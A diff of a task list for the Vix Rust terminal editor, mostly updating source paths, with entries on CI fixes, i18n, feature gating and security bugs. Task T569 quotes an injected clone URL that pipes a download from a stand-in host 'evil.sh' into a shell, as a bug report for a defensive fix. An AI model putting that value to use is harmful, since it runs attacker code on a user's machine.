   command-running action funnels through" per its own doc comment,
@@ -5366,13 +5366,13 @@ case-insensitive filesystems correctly).
   `ai_command_line` itself uses — they'd have silently started failing
   on Windows CI otherwise); (2) a new end-to-end adversarial test,
   `edit_with_instruction_prompt_cannot_inject_shell_commands`
-  (`tests/integration/ai.rs`) — runs a real subprocess (`printf %s
+  (`tui/tests/integration/ai.rs`) — runs a real subprocess (`printf %s
   {prompt}`, no output-shortcut faking) with an instruction packed
   with `"`, `&`, `%PATH%`, and backticks, asserting the text comes back
   through the AI diff byte-for-byte unchanged, proving it was
   interpolated as inert data rather than re-executed; (3) a new
   `run_command_merges_stderr_into_the_captured_output` test
-  (`tests/integration/editing.rs`) for the `{ }`/`( )` grouping change
+  (`tui/tests/integration/editing.rs`) for the `{ }`/`( )` grouping change
   specifically, with a two-statement, two-stream command built
   per-platform (`&` chains sequentially in `cmd.exe` but backgrounds in
   `sh`, so the same literal string isn't valid on both).
@@ -5396,7 +5396,7 @@ case-insensitive filesystems correctly).
   would create a marker file *only* if it ever escaped its quoting and
   ran as a separate statement, and the test asserts that file never
   appears. Also added unconditional CRLF-to-LF normalization to
-  `spawn_ai_cli`'s captured output (`src/app.rs`) — a real product
+  `spawn_ai_cli`'s captured output (`tui/src/app.rs`) — a real product
   improvement this surfaced, not just a test workaround: a Windows
   console command's text-mode output can be CRLF-terminated regardless
   of what produced it, and no downstream consumer (the diff view, the
@@ -5411,7 +5411,7 @@ case-insensitive filesystems correctly).
   commands`, `edit_with_instruction_runs_the_typed_text_and_always_
   opens_a_diff`) still failed — not with an error, but the same "timed
   out waiting for the AI task to finish" every one of the earlier
-  bugs' *symptoms* also produced, at `tests/integration/common.rs:137`.
+  bugs' *symptoms* also produced, at `tui/tests/integration/common.rs:137`.
   Diagnosed by comparing which tests passed vs. failed rather than
   guessing again: `run_command_in`'s own test (whose command line never
   gets a shell redirect) passed; every `spawn_ai_cli`-based test (whose
@@ -5564,7 +5564,7 @@ case-insensitive filesystems correctly).
   catch without the runner that didn't exist yet.
 - [x] **T549 — Workspace Dashboard's disk-usage stat shells out to
   `du`, unavailable on Windows; fails silently (cosmetic, not a
-  crash).** `src/app.rs:10872-10883`: `Command::new("du").arg("-sh")...`
+  crash).** `tui/src/app.rs:10872-10883`: `Command::new("du").arg("-sh")...`
   inside `if let Ok(out) = ... { }`, so on Windows the Dashboard's
   disk-size figure just never populates — already degrades gracefully,
   lowest priority of the three Windows findings. Fix: replace with a
@@ -5662,7 +5662,7 @@ re-watched the real Windows CI run each time).
   (confirmed no `\r` bytes), but GitHub's `windows-latest` runner's Git
   for Windows defaults to `core.autocrlf=true`, so `actions/checkout`
   writes them to the working tree as CRLF — and `include_str!` embeds
-  whatever's on disk at compile time. `tests/integration/tutor.rs`'s
+  whatever's on disk at compile time. `tui/tests/integration/tutor.rs`'s
   `status_bar_progress_updates_live_as_tasks_are_completed` simulates
   completing "delete this line" via `.replace("DELETE THIS ENTIRE
   LINE\n", "", 1)`; against CRLF-corrupted content the pattern's
@@ -5675,7 +5675,7 @@ re-watched the real Windows CI run each time).
   with `* text=auto eol=lf`, forcing every future checkout (any OS) to
   match what's already committed, plus explicit `-text` for the real
   binaries (`*.gif`, `*.sqlite`, common image/font extensions) and a
-  carve-out for `wix/main.wxs` (already committed CRLF — the WiX
+  carve-out for `tui/wix/main.wxs` (already committed CRLF — the WiX
   toolset's own convention, left alone rather than disagreed with).
   Confirmed adding the file didn't itself flag any tracked file as
   changed on this (already-LF) checkout.
@@ -5742,10 +5742,10 @@ starting any of them.
   new plumbing); `TERM`/color support looks sane (`std::env::var("TERM")`
   is set and isn't `"dumb"`; note `NO_COLOR`/`COLORTERM` if set, matching
   how badge/color decisions are made elsewhere). New `--doctor` bool
-  flag on `Cli` (`src/cli.rs`, alongside `--version`/`--tutor`'s own
+  flag on `Cli` (`tui/src/cli.rs`, alongside `--version`/`--tutor`'s own
   precedent) handled in `main.rs` before the TUI starts, printing to
   stdout and exiting — mirrors `--version`'s early-return shape
-  exactly, so the man-page generator (`examples/generate_man.rs`) picks
+  exactly, so the man-page generator (`tui/examples/generate_man.rs`) picks
   it up automatically once documented on the flag. Help menu entry
   runs the same checks and shows the report in a read-only overlay
   (reuse an existing text-report display, e.g. the same shape
@@ -5767,14 +5767,14 @@ starting any of them.
   `vix_spellcheck::load_for` — the exact discovery-and-parse path the
   editor itself uses, not a separate existence check, so a pass really
   means spellcheck works; `TERM`/`NO_COLOR`), each independently
-  pass/fail/skip. `--doctor` (`src/cli.rs`, `main.rs`) prints the report
+  pass/fail/skip. `--doctor` (`tui/src/cli.rs`, `main.rs`) prints the report
   and exits before the TUI starts, reusing `--version`'s early-return
   shape; **Help → Run Diagnostics** (new `vix-menu` leaf, new
   `help.doctor` action) shows the same report via the existing
   `WelcomePanel` overlay `Help → License`/`Privacy`/`Report an Issue`
   already use — no new overlay type needed, matching the task's own
   scoping note. `menu.item.help.doctor`(`.help`) translated into all 15
-  locales. New integration test (`tests/integration/menu.rs`) confirms
+  locales. New integration test (`tui/tests/integration/menu.rs`) confirms
   the menu wiring and that the report actually renders; `vix-doctor`'s
   own 6 unit tests cover each check's logic directly (the `TERM`/
   `NO_COLOR` decision factored into a pure `terminal_check` helper
@@ -5787,7 +5787,7 @@ starting any of them.
   since `clap::Parser`'s derive needs one named `bool` field per
   `#[arg(long)]` flag and there is no meaningful "combined state" here
   the way T149's conversions had. `docs/reference/actions.md`/
-  `man/vix.1` regenerated; `AGENTS.md`/`agents/share/crate-map.md`
+  `tui/man/vix.1` regenerated; `AGENTS.md`/`agents/share/crate-map.md`
   crate-count references (121→122) updated.
 - [x] **T554 — SBOM generation as a release artifact.** Emit a Software
   Bill of Materials (CycloneDX, via `cargo-cyclonedx`) alongside the
@@ -5831,7 +5831,7 @@ starting any of them.
   than silently fixing out of scope) that nothing currently runs `dist
   generate --mode ci --check` in CI itself — `release.yml`'s "generated,
   never hand-edited" contract is enforced only by convention, not a
-  gate, unlike `docs/reference/*.md`/`man/vix.1`'s own regenerate-and-
+  gate, unlike `docs/reference/*.md`/`tui/man/vix.1`'s own regenerate-and-
   diff step. No Rust source touched, so no new test coverage beyond
   `dist generate --check` itself passing; the actual `*.cdx.xml`
   generation can only be exercised for real on a version-tag release
@@ -5879,12 +5879,12 @@ starting any of them.
   text, so a `.tar`/`.zip` dependency would buy nothing; JSON's string
   escaping already handles arbitrary content safely and stays
   diffable if a person opens it directly. `--export-settings <PATH>`/
-  `--import-settings <PATH>` (`src/cli.rs`, extracted into a
+  `--import-settings <PATH>` (`tui/src/cli.rs`, extracted into a
   `handle_settings_bundle_flags` helper in `main.rs` once inlining
   pushed `main` over clippy's line-count limit) mirror `--doctor`'s
   early-return shape; **Vix → Export/Import Settings…** (two new
   `vix-menu` leaves, `PromptKind::ExportSettings`/`ImportSettings`,
-  `App::export_settings`/`import_settings` in `src/app/session.rs` next
+  `App::export_settings`/`import_settings` in `tui/src/app/session.rs` next
   to the existing `open_settings_file`) reuse the exact same crate
   functions, so there is only one bundling/import implementation, not
   two that could drift. Translated into all 15 locales (menu items +
@@ -5896,7 +5896,7 @@ starting any of them.
   elsewhere in this codebase — instead proving the pure logic:
   `destination_for`'s name→path mapping, `append_bak`'s collision
   safety, a full write/read round-trip in an isolated temp dir); two
-  new integration tests (`tests/integration/menu.rs`) — export is
+  new integration tests (`tui/tests/integration/menu.rs`) — export is
   read-only against the real config paths so it's run for real
   end-to-end, import's own test deliberately only confirms the prompt
   opens, never submits it, for the same real-file-safety reason; and a
@@ -5906,13 +5906,13 @@ starting any of them.
   second import correctly produces `.bak` — the only way to verify
   `apply`'s real-path-writing behavior at all without ever risking the
   real developer's own config directory. `docs/reference/actions.md`/
-  `man/vix.1` regenerated; `AGENTS.md`/`agents/share/crate-map.md`
+  `tui/man/vix.1` regenerated; `AGENTS.md`/`agents/share/crate-map.md`
   crate-count references updated.
 - [x] **T556 — A proper overlay for resolving Git merge conflicts.**
   **Correction to the Ideas-backlog framing below, found while sizing
   this**: per-conflict resolution is not actually a zero-to-one gap —
   `git.conflict_ours`/`git.conflict_theirs`/`git.conflict_both`
-  (`src/app/git.rs:127-131`, calling `resolve_conflict`) already accept
+  (`tui/src/app/git.rs:127-131`, calling `resolve_conflict`) already accept
   or reject one side at the cursor, and a separate `conflict_next`
   action already jumps to the next conflict marker in the buffer. What
   is genuinely missing: any *overview* — a count of how many conflicts
@@ -5955,7 +5955,7 @@ starting any of them.
   other list-and-jump overlay in this codebase already uses (`outline`
   was the direct model throughout — field placement, `overlay_
   capturing_keys`, `try_panel_key`/`try_panel_mouse`, the render
-  function's own row-highlighting/scroll-window shape in `src/ui/
+  function's own row-highlighting/scroll-window shape in `tui/src/ui/
   edit_surfaces.rs`) — no new architecture, just one more instance of
   an established pattern. Workspace-wide (every conflicted file, not
   just the active buffer) stayed out of scope as flagged, a natural
@@ -5963,7 +5963,7 @@ starting any of them.
   + help text + the overlay's own title/hint line). Verified: 6 new
   `vix-conflict-tool` unit tests (`find_all` ordering, `List`
   navigation bounds, `refresh`'s clamp-on-shrink behavior) plus 7 new
-  integration tests (`tests/integration/git.rs`) covering the open/
+  integration tests (`tui/tests/integration/git.rs`) covering the open/
   jump/resolve-without-closing/resolve-to-empty-then-close/Esc/render
   paths end to end against a real `App` — no real git repo needed
   (the parser and the overlay both work on plain buffer text, git only
@@ -5980,11 +5980,11 @@ starting any of them.
   different, narrower question: does *anything* Vix does get announced
   through a terminal's own screen-reader integration, or is every
   signal purely visual (color, cursor position, an overlay appearing)?
-  Confirmed while sizing this task: nothing in `src/app.rs` currently
+  Confirmed while sizing this task: nothing in `tui/src/app.rs` currently
   sets the terminal title (`\x1b]0;…\x07` or similar) or rings the
   terminal bell (`\x07`) on any state change — the only OSC sequences
   in the whole codebase are the existing cursor-shape ones
-  (`src/app.rs:7397-7405`). Primarily a research/documentation
+  (`tui/src/app.rs:7397-7405`). Primarily a research/documentation
   deliverable, not a redesign: produce a written audit
   (`docs/accessibility/index.md`, new) covering (1) what a well-behaved
   TUI *can* signal a screen reader through (terminal title updates,
@@ -6007,7 +6007,7 @@ starting any of them.
   modern full-screen-redraw TUI frameworks (Ink, Bubble Tea, tcell, and
   Vix's own foundation `ratatui`) identifies constant cursor
   repositioning plus whole-screen redraws as what actually "makes
-  screen readers go nuts," and Vix (`src/ui.rs`'s `draw` repaints
+  screen readers go nuts," and Vix (`tui/src/ui.rs`'s `draw` repaints
   everything every tick) fits that pattern exactly — confirmed by
   reading the actual rendering code, not assumed. Heavy box-drawing
   borders and Nerd-Font-icon-only signaling (grepped across the
@@ -6060,7 +6060,7 @@ as every other task.
 - [x] **T558 — Path traversal in `vix-settings-bundle` import: arbitrary
   file write via a crafted bundle, plus a silent, unreviewed overwrite of
   `config.toml`'s command-bearing fields.** `crates/vix-settings-bundle/
-  src/lib.rs`'s `destination_for` (`:179-190`) resolves the four fixed
+  tui/src/lib.rs`'s `destination_for` (`:179-190`) resolves the four fixed
   entry names to hardcoded paths, but treats any other bundle-entry name
   as `theme/<filename>` and joins it onto `themes_dir()` with **no
   traversal check** — `filename` comes straight from the untrusted
@@ -6133,7 +6133,7 @@ as every other task.
   so it crashes on lines that don't even match the keyword being
   searched for. All four run synchronously in the main input-handling
   path (`id_location` reached via `org_follow_id`,
-  `src/app/org.rs:643`; the `columns.rs` sites via `org.column_view`),
+  `tui/src/app/org.rs:643`; the `columns.rs` sites via `org.column_view`),
   so every hit is a full editor crash, not a contained background-thread
   failure — and `id_location`'s project-wide scan means a single stray
   accented word anywhere in the project poisons every `id:`-link follow.
@@ -6161,7 +6161,7 @@ as every other task.
   would have passed either way.
 - [x] **T560 — F1 "Keyboard Shortcuts" help overlay shows zero of the Vi
   keymap's own bindings (and none of Spacemacs's shared Vi vocabulary
-  either).** `App::shortcut_rows` (`src/app.rs:9021-9063`)'s `match
+  either).** `App::shortcut_rows` (`tui/src/app.rs:9021-9063`)'s `match
   self.settings.keymap.as_str()` block lists `"emacs" | "vscode-macos" |
   "vscode-windows" | "intellij-macos" | "intellij-windows" | "eclipse" |
   "sublime" | "apple"` at its `id @ (...)` arm (`:9039-9040`) but omits
@@ -6179,7 +6179,7 @@ as every other task.
   equivalent for `"vi"`; survived T145's later consolidation of this
   match arm untouched. The one existing test on this path
   (`help_overlay_includes_the_active_keymap_chords`,
-  `tests/integration/keymaps.rs:10-38`) only asserts on Spacemacs's
+  `tui/tests/integration/keymaps.rs:10-38`) only asserts on Spacemacs's
   leader chords and Emacs's `Ctrl X` chords, never plain Vi's own
   vocabulary, which is why this was never caught. Fix: add `"vi"` to the
   `id @ (...)` arm's id list; decide whether Spacemacs's own arm should
@@ -6220,7 +6220,7 @@ as every other task.
   PATH"`, `"none configured"`, `"TERM=dumb"`, the summary line, …) is a
   hardcoded English literal; the crate depends on `vix_settings`/
   `vix_spellcheck` only, never `vix_i18n`. Reached from
-  `src/app.rs:2801-2802` for **Help → Run Diagnostics** — a genuine
+  `tui/src/app.rs:2801-2802` for **Help → Run Diagnostics** — a genuine
   in-app overlay opened after `rust_i18n::set_locale` has already run,
   not just the CLI-only `--doctor` path (whose own English-only output
   is consistent with the pre-existing `--version` convention and not a
@@ -6331,7 +6331,7 @@ as every other task.
 - [x] **T564 — No bidi/RTL text support anywhere in the render path,
   affecting the `ar` (Arabic) locale.** `crates/vix-locale-model/src/
   lib.rs`'s `Locale` struct has no direction flag; nothing in
-  `src/ui.rs`/`src/ui/*.rs` checks for RTL; confirmed no bidi support
+  `tui/src/ui.rs`/`tui/src/ui/*.rs` checks for RTL; confirmed no bidi support
   exists in the dependency stack either (`ratatui`/`crossterm`'s vendored
   sources have zero bidi/RTL references; the `unicode-bidi` crate in
   `Cargo.lock` is an unrelated transitive dep, not wired into text
@@ -6383,7 +6383,7 @@ as every other task.
   locale-aware without the `jiff-icu` feature — confirmed via
   `Cargo.lock`, only `jiff-core`/`jiff-static`/`jiff-tzdb-platform` are
   pulled in. Rendered directly into the visible calendar header
-  (`src/ui/boxes.rs:56`), so a `de`/`fr`/`ar`/`ru`/… user sees e.g.
+  (`tui/src/ui/boxes.rs:56`), so a `de`/`fr`/`ar`/`ru`/… user sees e.g.
   `"September 2026"` in an otherwise-translated panel regardless of
   `settings.locale`. No locale-keyed month-name table exists elsewhere
   in the codebase to reuse. Fix: either enable `jiff-icu` and wire it to
@@ -6398,7 +6398,7 @@ as every other task.
   `calendar.month_12`. `title()` now builds the key at runtime
   (`format!("calendar.month_{:02}", self.shown.month())`) and passes
   it to `t!(&key)` — precedent for a runtime (non-literal) `t!` key
-  already existed elsewhere in the codebase (`src/app.rs`, `examples/
+  already existed elsewhere in the codebase (`tui/src/app.rs`, `tui/examples/
   list_commands.rs`). New permanent regression test
   (`title_uses_the_translated_month_name`) navigates to a known month
   (January) and checks the exact translated string under `en`/`de`/
@@ -6421,17 +6421,17 @@ as every other task.
   rest — `ar`/`hi`/`bn`/`zh`/`ja`/the Celtic locales keep `.`). Updated
   all 3 real call sites that produce user-facing output (`vix-file-
   information-panel`'s and `vix-system-information-panel`'s own
-  `human_bytes` wrappers, and `src/app.rs`'s workspace-dashboard disk
+  `human_bytes` wrappers, and `tui/src/app.rs`'s workspace-dashboard disk
   size) to pass `rust_i18n::locale()` through; the dashboard's call runs
   on a spawned background thread, so the locale is read on the main
   thread first and moved in, not read from the worker thread.
 - [x] **T568 — Find/Replace's "Alt C case / Alt R regex" hint is
   hardcoded English, inconsistent with the sibling DB-workbench hint
-  right next to it.** `src/ui/search.rs:493-497` — `format!("Alt C case:
+  right next to it.** `tui/src/ui/search.rs:493-497` — `format!("Alt C case:
   {}   Alt R regex: {}", …)` never wrapped in `t!()`; pre-existing since
   `ea4829a` (2026-06-12), not a recent regression, but a real, live gap
   — inconsistent with the near-identical, correctly-localized pattern
-  one file over (`src/ui/db.rs:69`, `t!("ui.db_connections_hint")`). A
+  one file over (`tui/src/ui/db.rs:69`, `t!("ui.db_connections_hint")`). A
   non-English user doing Find/Replace sees this one hint in English
   while everything else around it is translated. Trivial effort.
   **Done 2026-09-25.** New `ui.search_case_regex_hint` key (`"Alt C
@@ -6455,7 +6455,7 @@ v1.7.1 (2026-09-10 → 2026-10-09, ~150 PRs) plus its open issues. Each
 item below was checked against Vix's actual code first; the ttt PR that
 prompted it is cited so the reasoning can be re-checked. Already covered
 in Vix, so deliberately **not** tasks: inline images (`ratatui_image`),
-explorer git-status colors (`src/ui/explorer.rs`), reveal-active-file
+explorer git-status colors (`tui/src/ui/explorer.rs`), reveal-active-file
 (`vix-left-dock::reveal`), trim trailing whitespace (`trim-on-save`),
 transparent background, `vix -` stdin (T208), `llms.txt`, LSP URI
 percent-encoding (`vix_lsp::path_to_uri`), and flag-safe `git grep -e`
@@ -6466,7 +6466,7 @@ value/effort.
 
 - [x] **T569 — Git → Clone… injects the prompted URL into a shell
   command unquoted (shell + git-option injection).**
-  `src/app/git.rs:1274` runs `self.run_command(&format!("git clone
+  `tui/src/app/git.rs:1274` runs `self.run_command(&format!("git clone
   {url}"))`, and `run_command` hands that to `sh -c` / `cmd /c`. A
   "clone URL" pasted from a web page or chat, such as
   `https://example.org/r.git; curl -s evil.sh | sh`, runs the extra
@@ -6521,15 +6521,15 @@ value/effort.
   (`edit_bytes`) instead of a text buffer. For non-UTF-8 text, offer a
   lossy read-only open rather than an error. Apply the same guard to the
   other `read_to_string(&path)` sites a user can point at arbitrary
-  paths (`src/app.rs:5544/5910/5935`, `src/app/info_panels.rs:27`,
+  paths (`tui/src/app.rs:5544/5910/5935`, `tui/src/app/info_panels.rs:27`,
   explorer preview) via one shared helper, ideally in `vix-fileops`.
   Watch for the `vix -` stdin path (T208): it must keep working.
   **Small-medium effort.**
 - [x] **T572 — Files without write permission are never flagged as
   read-only.** `Editor::open` hardcodes `read_only: false`
   (`crates/vix-editor/src/editor.rs:586`). `Tab::read_only` is only set
-  by explicit toggles and synthetic tabs (`src/app.rs:2476`,
-  `src/app/org.rs:1531/1555`), so the user finds out only when the save
+  by explicit toggles and synthetic tabs (`tui/src/app.rs:2476`,
+  `tui/src/app/org.rs:1531/1555`), so the user finds out only when the save
   fails. ttt #698/#701 flag such files, show a lock on the tab, and
   confirm before a save attempt. Fix: decide in the spec whether
   "filesystem read-only" is a separate state from the user's View-only
@@ -6550,7 +6550,7 @@ value/effort.
   that runs the suite under `unshare -rn` (no network namespace) so a
   regression fails CI instead of a downstream packager. **Small effort.**
 - [x] **T574 — Budget the per-buffer gutter diff.** `vix_git::diff_marks`
-  (`crates/vix-git/src/lib.rs:151`, called from `src/app/git.rs:377`)
+  (`crates/vix-git/src/lib.rs:151`, called from `tui/src/app/git.rs:377`)
   runs `similar`'s Myers diff with no deadline against `HEAD`. Myers is
   linear-space but `O((N+M)·D)` time, so a large, heavily rewritten file
   can stall a frame. ttt #673 fixed the same thing (quadratic LCS memory,
@@ -6558,7 +6558,7 @@ value/effort.
   `TextDiff::configure().deadline(…)` (tens of ms) and skip the gutter
   diff above a line-count cap. If the diff ever moves to a background
   thread, drop results for a stale buffer generation. Add a regression
-  bench in `benches/`. **Small effort.**
+  bench in `tui/benches/`. **Small effort.**
 
 ### Robustness
 
@@ -6590,7 +6590,7 @@ value/effort.
   palette entries, i18n across all locales, and `vix-lsp`'s spec updated.
   **Small-medium effort.**
 - [x] **T577 — Opt-in "stage everything and commit?" when nothing is
-  staged.** `require_staged` (`src/app/git.rs:45`) just refuses with
+  staged.** `require_staged` (`tui/src/app/git.rs:45`) just refuses with
   `status.git_nothing_staged`. ttt #644 (and VS Code's
   `git.enableSmartCommit`) stages all changes first. Fix: a
   `git.smart_commit` setting (`"ask"` default, plus `"always"` and
@@ -6624,7 +6624,7 @@ value/effort.
   fails. **Small effort.**
 - [x] **T581 — Verify autoscroll while drag-selecting past the top or
   bottom edge.** ttt #699 fixed this in its editor. Vix's left-drag
-  handling (`src/app.rs:7911`/`7942`) may stop extending the selection
+  handling (`tui/src/app.rs:7911`/`7942`) may stop extending the selection
   once the pointer leaves the text area. Terminals only report drag on
   *motion*, so a held, still pointer outside the view needs a timer-driven
   scroll tick. Verify-first, as for T580. **Small effort.**
@@ -6647,14 +6647,14 @@ http/ai 0–2 alone, sql+http+ai 88; git/jj/lsp/dap/org 0. `org` is
 ### Prerequisites (worth doing even if no flag ever lands)
 
 - [x] **T582 — Shared plumbing a feature split depends on.**
-  - (a) `menu_index_for_alt` (`src/app.rs:13787`) hard-codes the
+  - (a) `menu_index_for_alt` (`tui/src/app.rs:13787`) hard-codes the
     Alt-mnemonic indices (`'g' => Some(9)`, …). Look each menu up by
     `MenuDef.name` instead, so removing or adding a top-level menu can't
-    move mnemonics. `tests/integration/menu.rs:366-393` already resolves
+    move mnemonics. `tui/tests/integration/menu.rs:366-393` already resolves
     by name.
   - (b) Delete the root package's vestigial direct deps: `sqlx`,
     `tokio`, `futures-util`, `ureq`, and `portable-pty`, which root
-    `src/` never names. Also delete the 15–16 dead `optional = true`
+    `tui/src/` never names. Also delete the 15–16 dead `optional = true`
     `tree-sitter-*` root deps, which create stray implicit features like
     `--features tree-sitter-rust`.
   - (c) Bring the stale internal `version = "1.5.0"` path-dep pins
@@ -6685,16 +6685,16 @@ http/ai 0–2 alone, sql+http+ai 88; git/jj/lsp/dap/org 0. `org` is
   the first time a no-`sql` build saves. Add a test that loads a
   config with every section and saves it with identical content.
   **Small-medium effort.**
-- [x] **T585 — Move inline dispatch out of `src/app.rs` into per-area
+- [x] **T585 — Move inline dispatch out of `tui/src/app.rs` into per-area
   submodules.** Today:
-  - DB (`db_action` and ~500 lines, `src/app.rs:9547-10060`), AI
+  - DB (`db_action` and ~500 lines, `tui/src/app.rs:9547-10060`), AI
     (~10061-10960), HTTP (misfiled in `run_lsp_action`, `:3175`),
     terminal, and project/tests are inline.
   - jj (`run_jj_action`) and the DAP `run.*` arms are misfiled inside
-    `run_git_action` (`src/app/git.rs:103-321`).
-  - `src/ui/ai_terminal.rs` mixes AI and terminal drawing.
+    `run_git_action` (`tui/src/app/git.rs:103-321`).
+  - `tui/src/ui/ai_terminal.rs` mixes AI and terminal drawing.
 
-  Give each area its own `src/app/<area>.rs` / `src/ui/<area>.rs`, the
+  Give each area its own `tui/src/app/<area>.rs` / `tui/src/ui/<area>.rs`, the
   same extraction technique as T141/T142, and update `dispatch_scan`'s
   `DISPATCHERS` list. This makes each later feature a module-level
   `#[cfg]`, not hundreds of scattered ones. **Medium effort,
@@ -6726,7 +6726,7 @@ http/ai 0–2 alone, sql+http+ai 88; git/jj/lsp/dap/org 0. `org` is
     and Codeberg if their quotas allow (GitLab CI quota has been
     exhausted since 2026-08-29).
   - Keep the source-text checks default-feature-only and say so in a
-    comment: `tests/action_catalog.rs` (via `dispatch_scan`), menu-bar
+    comment: `tui/tests/action_catalog.rs` (via `dispatch_scan`), menu-bar
     insta snapshots, and the `list_commands --write` / `generate_man`
     diffs.
   - Gate the existing `#[cfg(feature = "lang-rust")]` test pattern the
@@ -6740,11 +6740,11 @@ http/ai 0–2 alone, sql+http+ai 88; git/jj/lsp/dap/org 0. `org` is
 - [x] **T588 — `sql` feature.** `dep:vix-db` and `dep:vix-edit-sql`,
   48 exclusive crates and bundled SQLite C. Gate:
   - the App fields `db`/`edit_sql`
-  - the `src/app/db.rs` module from T585
-  - `src/ui/db.rs`
+  - the `tui/src/app/db.rs` module from T585
+  - `tui/src/ui/db.rs`
   - the three DB poll calls and `*_running` checks in `main.rs:216-238`
   - `AiDest::Db` (`cfg(all(feature = "sql", feature = "ai"))`)
-  - `tests/db_smoke.rs` and `tests/integration/db.rs`
+  - `tui/tests/db_smoke.rs` and `tui/tests/integration/db.rs`
 
   `TOOLS_INSERT_SQL` (plain text snippets) stays: it needs no DB. Prove
   it with `cargo tree --no-default-features -e normal | grep -c sqlx` =
@@ -6753,7 +6753,7 @@ http/ai 0–2 alone, sql+http+ai 88; git/jj/lsp/dap/org 0. `org` is
   (`Tab.image: Option<StatefulProtocol>`,
   `crates/vix-editor/src/editor.rs:187`). Gate the App `picker` field,
   the terminal image-support query at `main.rs:167-171`, and
-  `StatefulImage` in `src/ui/editor_region.rs`. With the feature off,
+  `StatefulImage` in `tui/src/ui/editor_region.rs`. With the feature off,
   image paths open in an "image preview not included in this build"
   info card, or the byte editor. Measure *after* T583; if the slimmed
   codec set is small, consider closing this as not worth it. **Medium
@@ -6761,11 +6761,11 @@ http/ai 0–2 alone, sql+http+ai 88; git/jj/lsp/dap/org 0. `org` is
 - [x] **T590 — `script` feature.** `dep:vix-script` (rhai, 9 crates;
   rhai is one of the largest single crates in the build). Gate:
   - the five script App fields
-  - `src/app/scripts.rs`
-  - the `script:` dynamic-action prefix guard (`src/app.rs:2617`)
+  - `tui/src/app/scripts.rs`
+  - the `script:` dynamic-action prefix guard (`tui/src/app.rs:2617`)
   - `resolve_key_overrides`' script bindings
   - `TOOLS_SCRIPTS`, by runtime filtering
-  - `tests/integration/scripting.rs` and `tests/example_scripts.rs`
+  - `tui/tests/integration/scripting.rs` and `tui/tests/example_scripts.rs`
 
   **Small-medium effort.**
 - [x] **T591 — `terminal` feature.** `dep:vix-terminal` (portable-pty,
@@ -6790,9 +6790,9 @@ http/ai 0–2 alone, sql+http+ai 88; git/jj/lsp/dap/org 0. `org` is
 - [x] **T593 — `git` and `jj` features (surface-only).** Gating them
   removes no third-party crates, only the spawning of `git`/`jj`. `git`
   touches the most shared UI:
-  - explorer colors (`src/ui/explorer.rs:47`)
-  - the status-bar segment (`src/ui/status_bar.rs:49-92`)
-  - the gutter (`src/ui.rs:173`) and the per-loop
+  - explorer colors (`tui/src/ui/explorer.rs:47`)
+  - the status-bar segment (`tui/src/ui/status_bar.rs:49-92`)
+  - the gutter (`tui/src/ui.rs:173`) and the per-loop
     `refresh_inline_blame`
   - `refresh_git()` from six call sites
   - the dashboard commit count, conflict tool, and diff-view
@@ -6879,17 +6879,17 @@ new action.
   (both threads read `two`) and passes now. Left open: the nextest
   isolation that T604 would add on top.
 - [x] **T597 — Spellcheck and the coverage gutter recompute every
-  frame.** `ui::draw` (`src/ui.rs:175`) calls `refresh_spellcheck`
-  (`src/app.rs:4731-4772`), which runs a full tree-sitter query
+  frame.** `ui::draw` (`tui/src/ui.rs:175`) calls `refresh_spellcheck`
+  (`tui/src/app.rs:4731-4772`), which runs a full tree-sitter query
   (`code.rs:886`), copies every comment and string range, and checks every
   word. That happens on every frame: every event, every 500 ms idle, and
-  every 50 ms while busy (`src/main.rs:299-317`).
-  `refresh_coverage_gutter` (`src/app/coverage.rs:89`) also redoes path
+  every 50 ms while busy (`tui/src/main.rs:299-317`).
+  `refresh_coverage_gutter` (`tui/src/app/coverage.rs:89`) also redoes path
   matching every frame. Fix: cache on `(active, revision)` like the word
   highlight, outline, backlinks, and git gutter siblings do. Optional:
   drain all pending events before each redraw (`main.rs:318` reads one per
   draw). Verify: a counter test (one recompute per revision) and a case in
-  `benches/frame_ops.rs`. **Small.**
+  `tui/benches/frame_ops.rs`. **Small.**
   Done 2026-10-22: `ui::draw` now calls `refresh_spellcheck_if_stale` and
   `refresh_coverage_gutter_if_stale`, which compare an `(active tab,
   revision)` key like the word-highlight and backlinks siblings do. The
@@ -6899,16 +6899,16 @@ new action.
   spellcheck path has no automated test because its dictionaries are
   untracked (the existing end-to-end spell test is `#[ignore]`). Left open:
   draining all pending events before each redraw (`main.rs:318`) and a
-  `benches/frame_ops.rs` case. Same weakness as the siblings: a tab closed
+  `tui/benches/frame_ops.rs` case. Same weakness as the siblings: a tab closed
   and a new one opened at the same index with an equal revision would reuse
   the old key until its first edit.
 
 - [x] **T598 — Discarded `Result`s that hide real failures.**
-  - `src/app/scripts.rs:175` `let _ = self.store_session(..)` silently
+  - `tui/src/app/scripts.rs:175` `let _ = self.store_session(..)` silently
     loses a script-trust decision (T545's shape).
-  - `src/app/modal.rs:509` and `src/app/org.rs:379` ignore
+  - `tui/src/app/modal.rs:509` and `tui/src/app/org.rs:379` ignore
     `vix_clipboard::set` (T542's pattern).
-  - `src/app.rs:7483` swallows a failed preview-tab open.
+  - `tui/src/app.rs:7483` swallows a failed preview-tab open.
   - `Editor::set_clipboard` (`crates/vix-editor-core/src/editor.rs:661`)
     returns a `Result` that is always `Ok`, which forces six more `let _ =`
     (`org.rs:985`, `ai.rs:682`, `org_table.rs:330`, `actions.rs:671,708`).
@@ -6926,7 +6926,7 @@ new action.
 - [x] **T599 — Move lints to `[workspace.lints]`, and lint the targets
   that are missed today.** No `[lints]` table exists anywhere, and 124
   crate roots repeat the same three attributes. 15 targets get no lints at
-  all: 6 `benches/*.rs`, 8 `tests/*.rs` (action_catalog, snapshots,
+  all: 6 `tui/benches/*.rs`, 8 `tests/*.rs` (action_catalog, snapshots,
   spawn_sites, …), and `crates/vix-i18n/build.rs`. Fix: in
   `[workspace.lints]` set `unsafe_code = "forbid"`, `missing_docs =
   "deny"`, and `clippy.pedantic = "warn"`, then add `lints.workspace =
@@ -6940,7 +6940,7 @@ new action.
   percent-encoding, pulldown-cmark, ratatui-core, rust-embed, sha2,
   spellbook, streaming-iterator, sysinfo, tree-sitter,
   unicode-segmentation, unicode-width, vix-capped-stack, vix-civil-date,
-  vix-greedy-wrap, vix-hex-rgb, and others. `src/` names none of them,
+  vix-greedy-wrap, vix-hex-rgb, and others. `tui/src/` names none of them,
   and the "absorbed from the former subcrates" comment (around line 285)
   is stale. Also unused: `serde` in vix-dap and vix-org-capture. The
   `rust-i18n` and `md-5` hits are false positives, so add them to
@@ -6982,14 +6982,14 @@ new action.
   published baseline yet. If CI fails on one, add it to an `--exclude`
   list until its first publish.
 - [x] **T603 — Remove draw-path `unwrap()`s, then gate `unwrap_used`.**
